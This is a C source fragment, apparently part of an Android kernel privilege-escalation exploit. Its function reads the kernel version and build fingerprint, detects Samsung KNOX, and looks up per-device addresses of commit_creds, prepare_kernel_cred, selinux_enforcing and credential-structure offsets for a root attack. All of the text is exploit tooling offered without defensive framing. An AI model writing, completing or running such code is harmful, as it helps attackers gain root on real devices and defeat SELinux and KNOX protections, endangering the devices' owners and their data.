// ========== AUTO-DETECTION ENGINE ==========

// Read /proc/version and find matching offsets
int auto_detect_offsets() {
    char version[1024] = {0};
    char build[512] = {0};
    
    // Get kernel version
    FILE *f = fopen("/proc/version", "r");
    if (f) {
        fgets(version, sizeof(version), f);
        fclose(f);
    }
    
    // Get build fingerprint for better matching
    f = fopen("/system/build.prop", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "ro.build.fingerprint")) {
                strcpy(build, line);
                break;
            }
        }
        fclose(f);
    }
    
    printf("[*] Detected kernel: %s", version);
    if (build[0]) printf("[*] Build: %s", build);
    
    // Check for Samsung/KNOX
    if (strstr(version, "Samsung") || strstr(version, "samsung") ||
        strstr(build, "samsung") || strstr(build, "Samsung")) {
        has_knox = 1;
        printf("[!] Samsung KNOX device detected\n");
    }
    
    // Try to match against database
    for (int i = 0; offset_database[i].version_pattern != NULL; i++) {
        if (strstr(version, offset_database[i].version_pattern) ||
            (build[0] && strstr(build, offset_database[i].version_pattern))) {
            
            commit_creds_addr = offset_database[i].commit_creds;
            prepare_kernel_cred_addr = offset_database[i].prepare_kernel_cred;
            selinux_enforcing_addr = offset_database[i].selinux_enforcing;
            cred_offset = offset_database[i].cred_offset;
            cred_uid_offset = offset_database[i].cred_uid_offset;
            cred_gid_offset = offset_database[i].cred_gid_offset;
            has_knox = offset_database[i].has_knox;
            
            printf("[+] MATCH FOUND! Using offsets for: %s\n", offset_database[i].version_pattern);
            printf("    commit_creds: 0x%lx\n", commit_creds_addr);
            printf("    cred_offset: 0x%lx\n", cred_offset);
            
            return 1;
        }
    }
    
    // No match found - fall back to pattern scanning
    printf("[-] No match in database. Falling back to pattern scanning...\n");
    return 0;
}

